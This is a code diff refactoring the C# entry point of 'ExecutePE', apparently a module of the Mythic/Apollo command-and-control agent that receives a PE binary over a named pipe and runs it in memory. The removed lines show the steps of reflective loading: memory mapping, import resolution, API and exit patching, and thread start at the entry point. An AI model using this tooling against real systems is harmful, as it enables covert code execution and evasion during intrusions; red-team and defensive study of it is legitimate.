@@ -2,12 +2,9 @@
 using System.Collections.Generic;
 using System.Text;
 using System.Linq;
-using ExecutePE.Internals;
-using ExecutePE.Patchers;
 using System.IO.Pipes;
 using ExecutePE.Helpers;
 using System.Threading;
-using System.Runtime.InteropServices;
 using ApolloInterop.Serializers;
 using System.Collections.Concurrent;
 using ApolloInterop.Interfaces;
@@ -17,47 +14,35 @@ using ApolloInterop.Structs.ApolloStructs;
 using ST = System.Threading.Tasks;
 using ApolloInterop.Classes.Events;
 using ApolloInterop.Enums.ApolloEnums;
-using System.ComponentModel;
 using ApolloInterop.Constants;
-using ApolloInterop.Utils;
 
 namespace ExecutePE
 {
     internal static class Program
     {
-
-        [DllImport("shell32.dll", SetLastError = true)]
-        static extern IntPtr CommandLineToArgvW(
-           [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
-           out int pNumArgs);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr LocalFree(IntPtr hMem);
-
         private static JsonSerializer _jsonSerializer = new JsonSerializer();
-        private static string _namedPipeName;
+        private static string? _namedPipeName;
         private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
         private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
-        private static AsyncNamedPipeServer _server;
+        private static AsyncNamedPipeServer? _server;
         private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
         private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
         private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
         private static CancellationTokenSource _cts = new CancellationTokenSource();
-        private static Action<object> _sendAction;
-        private static ST.Task _clientConnectedTask = null;
+        private static Action<object>? _sendAction;
+        private static ST.Task? _clientConnectedTask;
 
-        internal static Encoding encoding;
-        private static string _output = "";
 
         private static int Main(string[] args)
         {
+            AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(UnhandledAppDomainExceptionHandler);
+
             if (args.Length != 1)
             {
                 throw new Exception("No named pipe name given.");
             }
             _namedPipeName = args[0];
 
-            
             _sendAction = (object p) =>
             {
                 PipeStream pipe = (PipeStream)p;
@@ -76,121 +61,55 @@ namespace ExecutePE
                 pipe.Flush();
                 pipe.Close();
             };
-            _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
+
+            _server = new AsyncNamedPipeServer(_namedPipeName, instances: 1, BUF_OUT: IPC.SEND_SIZE, BUF_IN: IPC.RECV_SIZE);
             _server.ConnectionEstablished += OnAsyncConnect;
             _server.MessageReceived += OnAsyncMessageReceived;
-            _receiverEvent.WaitOne();
-            if (_recieverQueue.TryDequeue(out IMythicMessage exeArgs))
-            {
-                if (exeArgs.GetTypeCode() != MessageType.IPCCommandArguments)
-                {
-                    throw new Exception($"Got invalid message type. Wanted {MessageType.IPCCommandArguments}, got {exeArgs.GetTypeCode()}");
-                }
 
-                IPCCommandArguments command = (IPCCommandArguments)exeArgs;
-                try
-                {
-
-                    if (IntPtr.Size != 8)
-                    {
-                        return -1;
-                    }
-                    //string[] realArgs = ParseCommandLine(command.StringData);
-                    IEnumerable<string> realArgs = command.StringData.Split(' ');
-                    var peRunDetails = ParseArgs(realArgs.ToList());
-                    peRunDetails.binaryBytes = command.ByteData;
-
-                    if (peRunDetails == null)
-                    {
-                        return -10;
-                    }
-
-                    var peMapper = new PEMapper();
-                    peMapper.MapPEIntoMemory(peRunDetails.binaryBytes, out var pe, out var currentBase);
-
-                    var importResolver = new ImportResolver();
-                    importResolver.ResolveImports(pe, currentBase);
-
-                    peMapper.SetPagePermissions();
-
-                    var argumentHandler = new ArgumentHandler();
-                    if (!argumentHandler.UpdateArgs(peRunDetails.filename, peRunDetails.args))
-                    {
-                        return -3;
-                    }
-
-                    var exitPatcher = new ExitPatcher();
-                    if (!exitPatcher.PatchExit())
-                    {
-                        return -8;
-                    }
-
-                    var extraEnvironmentalPatcher = new ExtraEnvironmentPatcher((IntPtr)currentBase);
-                    extraEnvironmentalPatcher.PerformExtraEnvironmentPatches();
-
-                    // Patch this last as may interfere with other activity
-                    var extraAPIPatcher = new ExtraAPIPatcher();
-
-                    if (!extraAPIPatcher.PatchAPIs((IntPtr)currentBase))
-                    {
-                        return -9;
-                    }
-                    using (StdHandleRedirector redir = new StdHandleRedirector(OnBufferWrite))
-                    {
-                        StartExecution(peRunDetails.args, pe, currentBase);
-                    }
-
-
-                    // Revert changes
-                    exitPatcher.ResetExitFunctions();
-                    extraAPIPatcher.RevertAPIs();
-                    extraEnvironmentalPatcher.RevertExtraPatches();
-                    argumentHandler.ResetArgs();
-                    peMapper.ClearPE();
-                    importResolver.ResetImports();
-                }
-                catch (Exception e)
-                {
-                    DebugHelp.WriteToLogFile($"Error in execution: {e.Message}");
-                    return -6;
-                } 
-                finally
-                {
-                    _cts.Cancel();
-                }
-            }
-            return 0;
-        }
-
-        private static string[] ParseCommandLine(string cmdline)
-        {
-            int numberOfArgs;
-            IntPtr ptrToSplitArgs;
-            string[] splitArgs;
-
-            ptrToSplitArgs = CommandLineToArgvW(cmdline, out numberOfArgs);
-
-            // CommandLineToArgvW returns NULL upon failure.
-            if (ptrToSplitArgs == IntPtr.Zero)
-                throw new ArgumentException("Unable to split argument.", new Win32Exception());
-
-            // Make sure the memory ptrToSplitArgs to is freed, even upon failure.
+            int returnCode = 0;
             try
             {
-                splitArgs = new string[numberOfArgs];
+                if (IntPtr.Size != 8)
+                {
+                    throw new InvalidOperationException("Application architecture is not 64 bits");
+                }
 
-                // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
-                // Copy each of these strings into our split argument array.
-                for (int i = 0; i < numberOfArgs; i++)
-                    splitArgs[i] = Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));
+                _receiverEvent.WaitOne();
+                IMythicMessage taskMsg;
 
-                return splitArgs;
+                if (!_recieverQueue.TryDequeue(out taskMsg))
+                {
+                    throw new InvalidOperationException("Could not get tasking from Mythic");
+                }
+
+                if (taskMsg.GetTypeCode() != MessageType.ExecutePEIPCMessage)
+                {
+                    throw new Exception($"Got invalid message type. Wanted {MessageType.ExecutePEIPCMessage}, got {taskMsg.GetTypeCode()}");
+                }
+
+                ExecutePEIPCMessage peMessage = (ExecutePEIPCMessage)taskMsg;
+
+                using (StdHandleRedirector redir = new StdHandleRedirector(OnBufferWrite))
+                {
+                    PERunner.RunPE(peMessage);
+                }
+            }
+            catch (Exception exc)
+            {
+                // Handle any exceptions and try to send the contents back to Mythic
+                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(exc.ToString()));
+                _senderEvent.Set();
+
+                // Return the HRESULT as an exit code
+                returnCode = exc.HResult;
             }
             finally
             {
-                // Free memory obtained by CommandLineToArgW.
-                LocalFree(ptrToSplitArgs);
+                _cts.Cancel();
             }
+
+
+            return returnCode;
         }
 
         private static void OnBufferWrite(object sender, StringDataEventArgs args)
@@ -257,61 +176,11 @@ namespace ExecutePE
         }
 
 
-        private static void StartExecution(string[] binaryArgs, PELoader pe, long currentBase)
+        static void UnhandledAppDomainExceptionHandler(object sender, UnhandledExceptionEventArgs args)
         {
-            try
-            {
-                var threadStart = (IntPtr)(currentBase + (int)pe.OptionalHeader64.AddressOfEntryPoint);
-                var hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
-
-                NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
-            }
-            catch (Exception e)
-            {
-
-
-            }
-
+            Exception e = (Exception)args.ExceptionObject;
+            _senderQueue.Enqueue(Encoding.UTF8.GetBytes(e.ToString() + "\n"));
+            _senderEvent.Set();
         }
-
-        private static PeRunDetails ParseArgs(List<string> args)
-        {
-            string filename;
-            string[] binaryArgs;
-
-            if (args.Count > 1)
-            {
-                binaryArgs = new string[args.Count - 1];
-                Array.Copy(args.ToArray(), 1, binaryArgs, 0, args.Count - 1);
-            }
-            else
-            {
-                binaryArgs = new string[] { };
-            }
-            filename = args[0];
-            
-            return new PeRunDetails { filename = filename, args = binaryArgs };
-        }
-
-        private static void PrintUsage()
-        {
-
-
-
-
-
-
-
-
-        }
-
     }
-
-    internal class PeRunDetails
-    {
-        internal string filename;
-        internal string[] args;
-        internal byte[] binaryBytes;
-    }
-
 }
